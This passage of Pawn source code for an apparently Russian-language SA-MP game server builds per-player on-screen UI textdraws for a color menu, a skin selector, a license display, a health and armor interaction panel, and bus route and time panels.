	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][5], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][5], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][5], true);

	color_menu_player_td[playerid][6] = CreatePlayerTextDraw(playerid, 261.100494, 227.812591, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][6], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][6], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][6], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][6], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][6], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][6], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][6], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][6], true);

	color_menu_player_td[playerid][7] = CreatePlayerTextDraw(playerid, 298.900543, 227.812591, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][7], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][7], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][7], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][7], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][7], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][7], true);

	color_menu_player_td[playerid][8] = CreatePlayerTextDraw(playerid, 337.500518, 227.850067, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][8], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][8], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][8], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][8], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][8], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][8], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][8], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][8], true);

	color_menu_player_td[playerid][9] = CreatePlayerTextDraw(playerid, 375.700286, 227.887542, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][9], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][9], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][9], 41215);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][9], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][9], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][9], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][9], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][9], true);

	color_menu_player_td[playerid][10] = CreatePlayerTextDraw(playerid, 223.700195, 259.562500, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][10], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][10], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][10], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][10], -2147483393);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][10], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][10], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][10], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][10], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][10], true);

	color_menu_player_td[playerid][11] = CreatePlayerTextDraw(playerid, 261.100006, 259.399963, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][11], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][11], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][11], -2147450625);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][11], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][11], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][11], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][11], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][11], true);

	color_menu_player_td[playerid][12] = CreatePlayerTextDraw(playerid, 298.899932, 259.612396, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][12], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][12], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][12], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][12], 16711935);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][12], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][12], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][12], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][12], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][12], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][12], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][12], true);

	color_menu_player_td[playerid][13] = CreatePlayerTextDraw(playerid, 337.600128, 259.549865, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][13], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][13], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][13], -5963521);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][13], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][13], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][13], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][13], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][13], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][13], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][13], true);

	color_menu_player_td[playerid][14] = CreatePlayerTextDraw(playerid, 375.500122, 259.324798, "LD_BEAT:Chit");
	PlayerTextDrawLetterSize(playerid, color_menu_player_td[playerid][14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, color_menu_player_td[playerid][14], 37.269618, 31.979999);
	PlayerTextDrawAlignment(playerid, color_menu_player_td[playerid][14], 1);
	PlayerTextDrawColor(playerid, color_menu_player_td[playerid][14], -1523963137);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][14], 0);
	PlayerTextDrawSetOutline(playerid, color_menu_player_td[playerid][14], 0);
	PlayerTextDrawBackgroundColor(playerid, color_menu_player_td[playerid][14], 255);
	PlayerTextDrawFont(playerid, color_menu_player_td[playerid][14], 4);
	PlayerTextDrawSetProportional(playerid, color_menu_player_td[playerid][14], 0);
	PlayerTextDrawSetShadow(playerid, color_menu_player_td[playerid][14], 0);
	PlayerTextDrawSetSelectable(playerid, color_menu_player_td[playerid][14], true);

	skin_td_player[playerid][0] = CreatePlayerTextDraw(playerid, 94.099975, 258.962463, "id:_293");
	PlayerTextDrawLetterSize(playerid, skin_td_player[playerid][0], 0.228500, 1.298125);
	PlayerTextDrawTextSize(playerid, skin_td_player[playerid][0], 0.000000, 16.000000);
	PlayerTextDrawAlignment(playerid, skin_td_player[playerid][0], 2);
	PlayerTextDrawColor(playerid, skin_td_player[playerid][0], -1);
	PlayerTextDrawUseBox(playerid, skin_td_player[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, skin_td_player[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, skin_td_player[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, skin_td_player[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, skin_td_player[playerid][0], 255);
	PlayerTextDrawFont(playerid, skin_td_player[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, skin_td_player[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, skin_td_player[playerid][0], 0);

	skin_td_player[playerid][1] = CreatePlayerTextDraw(playerid, 93.599983, 278.863677, "завершить");
	PlayerTextDrawLetterSize(playerid, skin_td_player[playerid][1], 0.228500, 1.298125);
	PlayerTextDrawTextSize(playerid, skin_td_player[playerid][1], 10.000000, 16.000000);
	PlayerTextDrawAlignment(playerid, skin_td_player[playerid][1], 2);
	PlayerTextDrawColor(playerid, skin_td_player[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, skin_td_player[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, skin_td_player[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, skin_td_player[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, skin_td_player[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, skin_td_player[playerid][1], 255);
	PlayerTextDrawFont(playerid, skin_td_player[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, skin_td_player[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, skin_td_player[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, skin_td_player[playerid][1], true);

	TDEditor_LICPLAYER[playerid] = CreatePlayerTextDraw(playerid, 483.9392, 249.4998, "~r~~h~~h~отсутствует~n~~g~~h~~h~имеется~n~~r~~h~~h~отсутствует~n~~g~~h~~h~имеется"); // пусто
	PlayerTextDrawLetterSize(playerid, TDEditor_LICPLAYER[playerid], 0.1820, 0.9815);
	PlayerTextDrawTextSize(playerid, TDEditor_LICPLAYER[playerid], 1031.0000, 0.0000);
	PlayerTextDrawAlignment(playerid, TDEditor_LICPLAYER[playerid], 1);
	PlayerTextDrawColor(playerid, TDEditor_LICPLAYER[playerid], -1);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_LICPLAYER[playerid], 255);
	PlayerTextDrawFont(playerid, TDEditor_LICPLAYER[playerid], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_LICPLAYER[playerid], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_LICPLAYER[playerid], 0);

	TDEditor_INTERACTION_PLAYER[playerid][0] = CreatePlayerTextDraw(playerid, 181.055114, 144.533447, "yannis thompson");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 0.160115, 0.864997);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 546.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][0], 1);

	TDEditor_INTERACTION_PLAYER[playerid][1] = CreatePlayerTextDraw(playerid, 415.315734, 146.283447, "yannis thompson");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 0.160115, 0.864997);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 546.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][1], 1);

	TDEditor_INTERACTION_PLAYER[playerid][2] = CreatePlayerTextDraw(playerid, 173.838211, 277.816711, "box");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 0.000000, 0.878094);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 249.170761, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], -601546753);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][2], 1);

	TDEditor_INTERACTION_PLAYER[playerid][3] = CreatePlayerTextDraw(playerid, 173.838211, 297.017883, "box");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 0.000000, 0.878094);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 249.170761, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], -1431655681);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][3], 1);

	TDEditor_INTERACTION_PLAYER[playerid][4] = CreatePlayerTextDraw(playerid, 186.923965, 277.250213, "ЗДОРОВЬЕ: 100%");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 0.160115, 0.864997);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 546.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][4], 1);

	TDEditor_INTERACTION_PLAYER[playerid][5] = CreatePlayerTextDraw(playerid, 192.724319, 296.551391, "БРОНЯ: 100%");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 0.160115, 0.864997);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 546.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][5], 1);

	TDEditor_INTERACTION_PLAYER[playerid][6] = CreatePlayerTextDraw(playerid, 406.852416, 277.916717, "box");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 0.000000, 0.868094);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 481.982757, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], -601546753);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][6], 1);

	TDEditor_INTERACTION_PLAYER[playerid][7] = CreatePlayerTextDraw(playerid, 406.752410, 296.917877, "box");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 0.000000, 0.895094);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 481.982849, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], -1);
	PlayerTextDrawUseBox(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], -1431655681);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][7], 1);

	TDEditor_INTERACTION_PLAYER[playerid][8] = CreatePlayerTextDraw(playerid, 420.147491, 277.250183, "ЗДОРОВЬЕ: 100%");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 0.160115, 0.864997);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 546.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][8], 1);

	TDEditor_INTERACTION_PLAYER[playerid][9] = CreatePlayerTextDraw(playerid, 426.547882, 296.451354, "БРОНЯ: 100%");
	PlayerTextDrawLetterSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 0.160115, 0.864997);
	PlayerTextDrawTextSize(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 546.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 1);
	PlayerTextDrawColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 255);
	PlayerTextDrawFont(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 2);
	PlayerTextDrawSetProportional(playerid, TDEditor_INTERACTION_PLAYER[playerid][9], 1);

	bus_time[0][playerid] = CreatePlayerTextDraw(playerid, 83.119895, 324.159698, "usebox");
	PlayerTextDrawLetterSize(playerid, bus_time[0][playerid], 0.000000, 1.950989);
	PlayerTextDrawTextSize(playerid, bus_time[0][playerid], 39.919906, 0.000000);
	PlayerTextDrawAlignment(playerid, bus_time[0][playerid], 1);
	PlayerTextDrawColor(playerid, bus_time[0][playerid], 0);
	PlayerTextDrawUseBox(playerid, bus_time[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, bus_time[0][playerid], 102);
	PlayerTextDrawSetShadow(playerid, bus_time[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus_time[0][playerid], 0);
	PlayerTextDrawFont(playerid, bus_time[0][playerid], 0);

	bus_time[1][playerid] = CreatePlayerTextDraw(playerid, 45.120025, 324.700592, "10:00");
	PlayerTextDrawLetterSize(playerid, bus_time[1][playerid], 0.311599, 1.604977);
	PlayerTextDrawAlignment(playerid, bus_time[1][playerid], 1);
	PlayerTextDrawColor(playerid, bus_time[1][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus_time[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus_time[1][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, bus_time[1][playerid], 51);
	PlayerTextDrawFont(playerid, bus_time[1][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus_time[1][playerid], 1);

	bus_time[2][playerid] = CreatePlayerTextDraw(playerid, 83.279876, 318.240692, "usebox");
	PlayerTextDrawLetterSize(playerid, bus_time[2][playerid], 0.049199, 0.278456);
	PlayerTextDrawTextSize(playerid, bus_time[2][playerid], 39.359905, 0.000000);
	PlayerTextDrawAlignment(playerid, bus_time[2][playerid], 1);
	PlayerTextDrawColor(playerid, bus_time[2][playerid], 0);
	PlayerTextDrawUseBox(playerid, bus_time[2][playerid], true);
	PlayerTextDrawBoxColor(playerid, bus_time[2][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus_time[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus_time[2][playerid], 0);
	PlayerTextDrawFont(playerid, bus_time[2][playerid], 0);

	bus_time[3][playerid] = CreatePlayerTextDraw(playerid, 46.559974, 315.242492, "ВРЕМЯ:");
	PlayerTextDrawLetterSize(playerid, bus_time[3][playerid], 0.167599, 0.793600);
	PlayerTextDrawAlignment(playerid, bus_time[3][playerid], 1);
	PlayerTextDrawColor(playerid, bus_time[3][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus_time[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus_time[3][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, bus_time[3][playerid], 51);
	PlayerTextDrawFont(playerid, bus_time[3][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus_time[3][playerid], 1);

	bus[0][playerid] = CreatePlayerTextDraw(playerid, 625.244506, 167.359497, "usebox");
	PlayerTextDrawLetterSize(playerid, bus[0][playerid], 0.028399, 12.218209);
	PlayerTextDrawTextSize(playerid, bus[0][playerid], 453.866577, 0.000000);
	PlayerTextDrawAlignment(playerid, bus[0][playerid], 1);
	PlayerTextDrawColor(playerid, bus[0][playerid], 0);
	PlayerTextDrawUseBox(playerid, bus[0][playerid], true);
	PlayerTextDrawBoxColor(playerid, bus[0][playerid], 102);
	PlayerTextDrawSetShadow(playerid, bus[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[0][playerid], 0);
	PlayerTextDrawFont(playerid, bus[0][playerid], 0);

	bus[1][playerid] = CreatePlayerTextDraw(playerid, 626.293457, 155.865097, "usebox");
	PlayerTextDrawLetterSize(playerid, bus[1][playerid], 0.000000, 0.908020);
	PlayerTextDrawTextSize(playerid, bus[1][playerid], 453.471252, 0.000000);
	PlayerTextDrawAlignment(playerid, bus[1][playerid], 1);
	PlayerTextDrawColor(playerid, bus[1][playerid], 865730559);
	PlayerTextDrawUseBox(playerid, bus[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, bus[1][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[1][playerid], 0);
	PlayerTextDrawFont(playerid, bus[1][playerid], 0);

	bus[2][playerid] = CreatePlayerTextDraw(playerid, 470.035278, 153.614105, "информация о проезде");
	PlayerTextDrawLetterSize(playerid, bus[2][playerid], 0.278887, 1.256533);
	PlayerTextDrawAlignment(playerid, bus[2][playerid], 1);
	PlayerTextDrawColor(playerid, bus[2][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[2][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[2][playerid], 51);
	PlayerTextDrawFont(playerid, bus[2][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[2][playerid], 1);

	bus[3][playerid] = CreatePlayerTextDraw(playerid, 458.164489, 239.941162, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, bus[3][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, bus[3][playerid], 163.777786, 12.195554);
	PlayerTextDrawAlignment(playerid, bus[3][playerid], 1);
	PlayerTextDrawColor(playerid, bus[3][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[3][playerid], 0);
	PlayerTextDrawFont(playerid, bus[3][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, bus[3][playerid], true);

	bus[5][playerid] = CreatePlayerTextDraw(playerid, 493.750854, 240.805206, "г. Арзамас - д. Гарель");
	PlayerTextDrawLetterSize(playerid, bus[5][playerid], 0.206441, 1.062399);
	PlayerTextDrawAlignment(playerid, bus[5][playerid], 1);
	PlayerTextDrawColor(playerid, bus[5][playerid], -1);
	PlayerTextDrawSetShadow(playerid, bus[5][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[5][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, bus[5][playerid], 51);
	PlayerTextDrawFont(playerid, bus[5][playerid], 2);
	PlayerTextDrawSetProportional(playerid, bus[5][playerid], 1);

	bus[6][playerid] = CreatePlayerTextDraw(playerid, 458.796356, 262.279083, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, bus[6][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, bus[6][playerid], 48.222248, 13.887989);
	PlayerTextDrawAlignment(playerid, bus[6][playerid], 1);
	PlayerTextDrawColor(playerid, bus[6][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus[6][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[6][playerid], 0);
	PlayerTextDrawFont(playerid, bus[6][playerid], 4);
	PlayerTextDrawSetSelectable(playerid, bus[6][playerid], true);

	bus[7][playerid] = CreatePlayerTextDraw(playerid, 572.116821, 261.885284, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, bus[7][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, bus[7][playerid], 48.222248, 13.887989);
	PlayerTextDrawAlignment(playerid, bus[7][playerid], 1);
	PlayerTextDrawColor(playerid, bus[7][playerid], 865730559);
	PlayerTextDrawSetShadow(playerid, bus[7][playerid], 0);
	PlayerTextDrawSetOutline(playerid, bus[7][playerid], 0);
